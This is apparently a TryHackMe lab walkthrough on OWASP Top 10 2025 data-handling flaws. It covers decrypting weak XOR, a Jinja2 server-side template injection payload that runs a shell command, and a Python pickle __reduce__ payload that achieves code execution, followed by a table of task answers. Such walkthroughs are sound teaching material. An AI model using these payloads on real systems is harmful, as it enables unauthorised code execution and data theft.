# OWASP Top 10 2025: Insecure Data Handling

{% embed url="https://tryhackme.com/room/owasptop102025insecuredatahandling" %}

Exploiting data processing vulnerabilities from the OWASP Top 10 2025 catalog: Cryptographic Failures (A04), Server-Side Template Injection (A05), and Insecure Deserialization (A08).

---

## 1. A04 — Cryptographic Failures (Weak XOR)

The application encrypts user notes using repeating XOR with a static weak key.
1. Download the Base64-encoded encrypted string.
2. In CyberChef, decode from Base64 and apply **XOR** with the recovered key `key1`.
3. Reading the decrypted note reveals the confidential information and flag.

---

## 2. A05 — Server-Side Template Injection (SSTI)

The application evaluates user input directly within Python's Jinja2 templating engine:
```jinja2
{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
```
Executing this payload returns the flag from the local directory:
`flag{hidden}`

---

## 3. A08 — Insecure Deserialization (Python Pickle)

The web application unpickles untrusted base64 user input. The Python `pickle` module executes arbitrary code if a class implements `__reduce__`:

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat flag.txt > output.txt',))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

Submitting the serialized payload forces the web application to execute system commands and output the flag.

---

## 🏁 Questions & Answers

| Task | Vulnerability Type | Solution Method |
|---|---|---|
| **Task 2** | A04: Cryptographic Failures | Decrypted Base64 XOR notes using static key `key1` |
| **Task 3** | A05: Server-Side Template Injection | Jinja2 SSTI payload: `flag{hidden}` |
| **Task 4** | A08: Insecure Deserialization | Python `pickle` payload leveraging `__reduce__` RCE |
